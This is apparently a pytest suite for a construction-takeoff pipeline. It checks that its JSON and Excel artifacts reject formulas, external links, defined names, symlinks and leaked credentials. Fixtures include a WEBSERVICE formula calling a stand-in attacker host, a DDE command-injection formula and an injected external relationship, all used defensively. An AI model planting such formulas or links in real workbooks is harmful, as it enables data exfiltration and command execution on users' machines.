from __future__ import annotations

import hashlib
import json
import zipfile
from pathlib import Path

import pytest
from openpyxl import Workbook, load_workbook
from openpyxl.workbook.defined_name import DefinedName
from pypdf import PdfWriter

from app.config import Settings
from app.models import JobRecord, JobStatus, TakeoffDocument
from app.pipeline import PipelineManager
from app.store import JobStore
from app.validation import (
    ArtifactValidationError,
    validate_json_artifact,
    reject_secret_material,
    validate_takeoff_artifact,
    validate_workbook_artifact,
)


def make_source_pdf(path: Path) -> str:
    writer = PdfWriter()
    writer.add_blank_page(width=200, height=100)
    writer.write(str(path))
    return hashlib.sha256(path.read_bytes()).hexdigest()


def takeoff_payload(source_hash: str) -> dict[str, object]:
    return {
        "source": {"sha256": source_hash, "page_count": 1},
        "assets": [
            {
                "unit_id": "TEST-DOOR-001",
                "code": "DOOR",
                "description": "Single door",
                "page": 1,
                "sheet": "A-101",
                "area_code": "L1",
                "area": "Level 1",
                "level": "1",
                "method": "symbol count",
                "confidence": "high",
                "x": 50,
                "y": 40,
                "quantity": 1,
                "unit": "EA",
            }
        ],
        "by_code": [{"code": "DOOR", "quantity": 1}],
        "by_area": [{"area_code": "L1", "quantity": 1}],
        "limitations": [],
    }


def make_workbook(path: Path, payload: dict[str, object]) -> None:
    workbook = Workbook()
    worksheet = workbook.active
    worksheet.title = "Takeoff"
    headers = [
        "unit_id",
        "code",
        "description",
        "page",
        "sheet",
        "area_code",
        "area",
        "level",
        "method",
        "confidence",
        "quantity",
        "unit",
    ]
    worksheet.append(headers)
    asset = payload["assets"][0]
    worksheet.append([asset[header] for header in headers])
    workbook.save(path)
    workbook.close()


def add_external_relationship(path: Path) -> None:
    replacement = path.with_name("rewritten-takeoff.xlsx")
    with zipfile.ZipFile(path, "r") as source, zipfile.ZipFile(
        replacement, "w"
    ) as destination:
        for entry in source.infolist():
            payload = source.read(entry)
            if entry.filename == "_rels/.rels":
                xml = payload.decode("utf-8")
                external = (
                    "<Relationship Id='rIdAuditExternal' "
                    "Type='http://schemas.openxmlformats.org/"
                    "officeDocument/2006/relationships/hyperlink' "
                    "Target='https://attacker.invalid/' "
                    "TargetMode='External'/>"
                )
                xml = xml.replace(
                    "</Relationships>",
                    f"{external}</Relationships>",
                )
                payload = xml.encode("utf-8")
            destination.writestr(entry, payload)
    replacement.replace(path)


def rewrite_workbook_definition_as_utf16(path: Path) -> None:
    replacement = path.with_name("utf16-takeoff.xlsx")
    with zipfile.ZipFile(path, "r") as source, zipfile.ZipFile(
        replacement, "w"
    ) as destination:
        for entry in source.infolist():
            payload = source.read(entry)
            if entry.filename == "xl/workbook.xml":
                payload = payload.decode("utf-8").encode("utf-16")
            destination.writestr(entry, payload)
    replacement.replace(path)


def test_takeoff_and_workbook_reconcile(tmp_path: Path) -> None:
    inputs = tmp_path / "inputs"
    artifacts = tmp_path / "artifacts"
    inputs.mkdir()
    artifacts.mkdir()
    drawings = inputs / "drawings.pdf"
    payload = takeoff_payload(make_source_pdf(drawings))
    takeoff_path = artifacts / "takeoff.json"
    takeoff_path.write_text(json.dumps(payload), encoding="utf-8")
    workbook_path = artifacts / "takeoff.xlsx"
    make_workbook(workbook_path, payload)

    document, pages = validate_takeoff_artifact(
        takeoff_path,
        drawings_path=drawings,
        artifacts_dir=artifacts,
        inputs_dir=inputs,
    )
    validate_workbook_artifact(
        workbook_path, takeoff=document, artifacts_dir=artifacts
    )
    assert pages == 1


def test_takeoff_rejects_bad_summary_and_out_of_page_geometry(
    tmp_path: Path,
) -> None:
    inputs = tmp_path / "inputs"
    artifacts = tmp_path / "artifacts"
    inputs.mkdir()
    artifacts.mkdir()
    drawings = inputs / "drawings.pdf"
    payload = takeoff_payload(make_source_pdf(drawings))
    payload["assets"][0]["x"] = 500
    payload["by_code"][0]["quantity"] = 99
    path = artifacts / "takeoff.json"
    path.write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(ArtifactValidationError):
        validate_takeoff_artifact(
            path,
            drawings_path=drawings,
            artifacts_dir=artifacts,
            inputs_dir=inputs,
        )


def test_workbook_rejects_corrupt_container(tmp_path: Path) -> None:
    artifacts = tmp_path / "artifacts"
    artifacts.mkdir()
    payload = takeoff_payload("a" * 64)
    document = TakeoffDocument.model_validate(payload)
    workbook_path = artifacts / "takeoff.xlsx"
    workbook_path.write_bytes(b"PK corrupt")
    with pytest.raises(ArtifactValidationError):
        validate_workbook_artifact(
            workbook_path, takeoff=document, artifacts_dir=artifacts
        )


@pytest.mark.parametrize(
    "formula",
    [
        '=WEBSERVICE("https://attacker.invalid/")',
        "=cmd|' /C calc'!A0",
    ],
)
def test_workbook_rejects_every_formula_including_dde(
    tmp_path: Path,
    formula: str,
) -> None:
    artifacts = tmp_path / "artifacts"
    artifacts.mkdir()
    payload = takeoff_payload("a" * 64)
    document = TakeoffDocument.model_validate(payload)
    workbook_path = artifacts / "takeoff.xlsx"
    make_workbook(workbook_path, payload)
    workbook = load_workbook(workbook_path)
    workbook["Takeoff"]["N2"] = formula
    workbook.save(workbook_path)
    workbook.close()
    with pytest.raises(ArtifactValidationError, match="not permitted"):
        validate_workbook_artifact(
            workbook_path, takeoff=document, artifacts_dir=artifacts
        )


def test_workbook_rejects_single_quoted_external_relationship(
    tmp_path: Path,
) -> None:
    artifacts = tmp_path / "artifacts"
    artifacts.mkdir()
    payload = takeoff_payload("a" * 64)
    document = TakeoffDocument.model_validate(payload)
    workbook_path = artifacts / "takeoff.xlsx"
    make_workbook(workbook_path, payload)
    add_external_relationship(workbook_path)

    with pytest.raises(
        ArtifactValidationError,
        match="external or active relationships",
    ):
        validate_workbook_artifact(
            workbook_path, takeoff=document, artifacts_dir=artifacts
        )


def test_workbook_rejects_normal_defined_name_formula(
    tmp_path: Path,
) -> None:
    artifacts = tmp_path / "artifacts"
    artifacts.mkdir()
    payload = takeoff_payload("a" * 64)
    document = TakeoffDocument.model_validate(payload)
    workbook_path = artifacts / "takeoff.xlsx"
    make_workbook(workbook_path, payload)
    workbook = load_workbook(workbook_path)
    workbook.defined_names.add(
        DefinedName(
            "OrdinaryCalculation",
            attr_text="SUM(Takeoff!$L$2)",
        )
    )
    workbook.save(workbook_path)
    workbook.close()

    with pytest.raises(
        ArtifactValidationError,
        match="defined names are not permitted",
    ):
        validate_workbook_artifact(
            workbook_path, takeoff=document, artifacts_dir=artifacts
        )


def test_workbook_rejects_utf16_defined_name_formula(
    tmp_path: Path,
) -> None:
    artifacts = tmp_path / "artifacts"
    artifacts.mkdir()
    payload = takeoff_payload("a" * 64)
    document = TakeoffDocument.model_validate(payload)
    workbook_path = artifacts / "takeoff.xlsx"
    make_workbook(workbook_path, payload)
    workbook = load_workbook(workbook_path)
    workbook.defined_names.add(
        DefinedName(
            "EncodedCalculation",
            attr_text="SUM(Takeoff!$L$2)",
        )
    )
    workbook.save(workbook_path)
    workbook.close()
    rewrite_workbook_definition_as_utf16(workbook_path)

    with pytest.raises(
        ArtifactValidationError,
        match="defined names are not permitted",
    ):
        validate_workbook_artifact(
            workbook_path, takeoff=document, artifacts_dir=artifacts
        )


def test_symlink_artifacts_are_never_read_or_registered(
    tmp_path: Path,
) -> None:
    artifacts = tmp_path / "artifacts"
    artifacts.mkdir()
    outside = tmp_path / "secret"
    outside.write_text("CODEX_API_KEY=should-not-leak", encoding="utf-8")
    link = artifacts / "takeoff.json"
    link.symlink_to(outside)
    with pytest.raises(ArtifactValidationError, match="non-symlink"):
        validate_json_artifact(link, artifacts)

    settings = Settings(
        data_dir=tmp_path / "data",
        codex_bin="codex",
        default_model="gpt-5.6-sol",
        max_upload_bytes=10_000,
        max_total_upload_bytes=10_000,
        service_api_token=None,
        max_workers=1,
        environment="test",
    )
    store = JobStore(settings.data_dir / "jobs")
    job_dir = store.create(
        JobRecord(
            id="symlinkjob",
            status=JobStatus.running,
            model=settings.default_model,
        )
    )
    artifact_link = job_dir / "artifacts" / "takeoff.json"
    artifact_link.symlink_to(outside)
    manager = PipelineManager(settings, store)
    with pytest.raises(ArtifactValidationError):
        manager._artifact("symlinkjob", artifact_link)


def test_exact_credential_material_is_rejected(tmp_path: Path) -> None:
    secret = "sk-test-not-a-real-key"
    artifact = tmp_path / "methodology.json"
    artifact.write_text(
        json.dumps({"note": f"stolen {secret}"}),
        encoding="utf-8",
    )
    with pytest.raises(ArtifactValidationError, match="credential material"):
        reject_secret_material(artifact, secret=secret)


def test_optional_pricing_metadata_is_allowed_but_bounded() -> None:
    payload = takeoff_payload("a" * 64)
    payload["assets"][0]["supplier"] = "Verified supplier"
    payload["assets"][0]["unit_price_dop"] = 1250.5
    document = TakeoffDocument.model_validate(payload)
    assert document.assets[0].supplier == "Verified supplier"

    payload["assets"][0]["supplier"] = "x" * 4_001
    with pytest.raises(ValueError, match="4000 characters"):
        TakeoffDocument.model_validate(payload)
